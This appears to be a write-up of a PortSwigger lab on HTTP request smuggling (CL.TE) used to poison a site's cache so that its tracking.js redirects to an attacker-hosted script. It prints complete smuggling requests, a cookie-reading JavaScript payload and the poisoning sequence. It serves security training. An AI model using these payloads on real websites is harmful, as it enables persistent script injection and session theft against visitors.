#  HTTP - request smuggling to perform web cache poisoning

## 📌 Lab Details
- **Title**: HTTP request smuggling to perform web cache poisoning
- **Difficulty**: Expert
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/25d1dc76d4c49c69b12c03e8e115ea2c4ecce7048480403afd87ae4fa5196c6a?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-perform-web-cache-poisoning

## 🔍 Summary
This lab uses a **CL.TE request smuggling attack** (front-end only understands `Content-Length`, back-end accepts `Transfer-Encoding`) to poison the cache. By smuggling a request that changes the response for `/resources/js/tracking.js`, the attacker makes the cache serve a redirect to their exploit server. Victims loading the site then fetch the poisoned script, which runs attacker-controlled JavaScript (`alert(document.cookie)`), simulating a persistent XSS.

## 🛠 Steps to Solve
1. Open a blog post, click "Next post", and try smuggling the resulting request with a different Host header:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 129
   Transfer-Encoding: chunked

   0

   GET /post/next?postId=3 HTTP/1.1
   Host: anything
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10

   x=1
   ```
2. Observe that you can use this request to make the next request to the website get redirected to `/post` on a host of your choice.
3. Go to your exploit server, and create a text/javascript file at `/post` with the contents:
   ```sh
   alert(document.cookie)
   ```
4. Poison the server cache by first relaunching the previous attack using your exploit server's hostname as follows:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 193
   Transfer-Encoding: chunked

   0

   GET /post/next?postId=3 HTTP/1.1
   Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10

   x=1
   ```
5. Then fetch `/resources/js/tracking.js` by sending the following request:
   ```sh
   GET /resources/js/tracking.js HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Connection: close
   ```
   If the attack has succeeded, the response to the `tracking.js` request should be a redirect to your exploit server.
6. Confirm that the cache has been poisoned by repeating the request to `tracking.js` several times and confirming that you receive the redirect every time.

## 📖 Key Takeaways
- **Smuggling for Cache Poisoning**: Instead of directly stealing responses, you poison the cache so every victim requesting `tracking.js` gets redirected to your payload.
- Successful poisoning relies on picking a resource the victim (and all users) will definitely load (`/resources/js/tracking.js`).
- The malicious JavaScript file hosted on your exploit server runs in the victim’s browser (`alert(document.cookie)` here, but in real-world scenarios could be full XSS or session hijacking).
- Unlike one-off request smuggling, cache poisoning makes the attack **persistent** until the cache expires or is overwritten.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8983e216-f0f5-4c6c-b94c-e2b37feab879" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/50581f5f-b663-490a-96c0-8fc0ed27183d" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/289ae624-b6f1-4b56-8b5a-59ce8b266102" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d992a45b-8cdc-4dce-89f0-b48c09bb25d4" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b5c72dea-d3d6-494b-bf74-4518e2ab762c" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4b384704-4397-4f83-98b8-a7e4fae54320" />
